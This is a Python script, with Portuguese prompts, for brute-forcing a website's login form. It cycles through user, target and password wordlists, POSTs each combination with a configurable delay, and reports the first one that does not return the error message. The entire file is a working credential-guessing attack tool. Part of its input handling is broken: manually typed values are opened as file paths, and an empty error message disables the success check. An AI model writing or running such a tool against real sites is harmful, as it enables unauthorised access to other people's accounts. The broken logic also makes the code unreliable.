import requests
import time
import itertools

def fazer_requisicao(url, payload):
    response = requests.post(url, data=payload)
    return response.text

def substituir_variaveis(url, usuario, alvo, senha, cooldown, mensagem_erro=None):
    with open(usuario, 'r', encoding='utf-8', errors='ignore') as arquivo_usuario, \
         open(alvo, 'r', encoding='utf-8', errors='ignore') as arquivo_alvo, \
         open(senha, 'r', encoding='utf-8', errors='ignore') as arquivo_senha:

        usuarios = arquivo_usuario.readlines()
        alvos = arquivo_alvo.readlines()
        senhas = arquivo_senha.readlines()

        combinacoes = list(itertools.product(usuarios, alvos, senhas))
        total_combinacoes = len(combinacoes)
        print('Total de combinações a serem testadas:', total_combinacoes)

        for i, combinacao in enumerate(combinacoes, start=1):
            usuario_atual = combinacao[0].strip()
            alvo_atual = combinacao[1].strip()
            senha_atual = combinacao[2].strip()

            payload = {
                'user': usuario_atual,
                'target': alvo_atual,
                'password': senha_atual
            }

            resposta = fazer_requisicao(url, payload)
            if mensagem_erro is not None and mensagem_erro not in resposta:
                return (usuario_atual, alvo_atual, senha_atual)
            elif mensagem_erro is None and resposta:
                return resposta

            print(f'Combinação {i}/{total_combinacoes} testada. Aguardando cooldown...')
            time.sleep(cooldown)

    return None

def main():
    site_url = input('Informe o URL do site alvo: ')
    cooldown = int(input('Informe o tempo de cooldown em segundos: '))

    usar_wordlist_usuario = input('Deseja usar uma wordlist para o campo "Usuário"? (S/N): ')
    if usar_wordlist_usuario.upper() == 'S':
        wordlist_usuario = input('Informe o caminho para a wordlist de Usuário: ')
    else:
        wordlist_usuario = None

    usar_wordlist_alvo = input('Deseja usar uma wordlist para o campo "Alvo"? (S/N): ')
    if usar_wordlist_alvo.upper() == 'S':
        wordlist_alvo = input('Informe o caminho para a wordlist de Alvo: ')
    else:
        wordlist_alvo = None

    usar_wordlist_senha = input('Deseja usar uma wordlist para o campo "Senha"? (S/N): ')
    if usar_wordlist_senha.upper() == 'S':
        wordlist_senha = input('Informe o caminho para a wordlist de Senha: ')
    else:
        wordlist_senha = None

    erro_personalizado = input('Informe a mensagem de erro personalizada (ou deixe em branco): ')

    usuario = wordlist_usuario if wordlist_usuario else input('Informe o usuário manualmente: ')
    alvo = wordlist_alvo if wordlist_alvo else input('Informe o alvo manualmente: ')
    senha = wordlist_senha if wordlist_senha else input('Informe a senha manualmente: ')

    senha_encontrada = substituir_variaveis(site_url, usuario, alvo, senha, cooldown, erro_personalizado)

    if senha_encontrada is not None:
        print('Combinação encontrada:')
        print('Usuário:', senha_encontrada[0])
        print('Alvo:', senha_encontrada[1])
        print('Senha:', senha_encontrada[2])
    else:
        print('Nenhuma combinação encontrada.')

if __name__ == '__main__':
    main()
